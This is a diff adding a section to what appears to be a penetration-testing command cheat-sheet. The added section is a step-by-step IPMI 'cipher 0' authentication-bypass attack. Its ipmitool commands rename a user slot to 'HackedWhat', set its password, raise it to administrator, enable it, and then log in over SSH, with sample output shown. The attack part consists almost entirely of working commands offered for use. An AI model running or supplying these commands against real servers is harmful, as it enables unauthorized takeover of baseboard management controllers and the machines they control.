@@ -188,6 +188,24 @@ vncviewer -via user@10.0.8.17 localhost:2
 
 --------------------------------------------------------------------------------------------------------------------
 
+# IPMI cipher 0
+ipmitool -I lanplus -C 0 -H ip.ad.dr.ess -U ## -P whatever  user list
+## -U USERID, Administrator, Admin, root 
+ipmitool -I lanplus -C 0 -H ip.ad.dr.ess -U ## -P whatever user set name # HackedWhat
+ipmitool -I lanplus -C 0 -H ip.ad.dr.ess -U ## -P whatever user set password 2 h3h3h3H3!
+ipmitool -I lanplus -C 0 -H ip.ad.dr.ess -U ## -P whatever user priv # 4
+ipmitool -I lanplus -C 0 -H ip.ad.dr.ess -U ## -P whatever user enable #
+ 
+ipmitool -I lanplus -C 0 -H ip.ad.dr.ess -U ## -P whatever user list
+##ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
+##1  Administrator    true    false      true      ADMINISTRATOR
+##2  HackedWhat     true    false      true      ADMINISTRATOR
+ 
+ssh HackedWhat@ip.ad.dr.ess
+HackedWhat @ip.ad.dr.ess password: h3h3h3H3!
+
+--------------------------------------------------------------------------------------------------------------------
+
 #Setup IPTables for wifi forwarding
 
 echo 1 > /proc/sys/net/ipv4/ip_forward
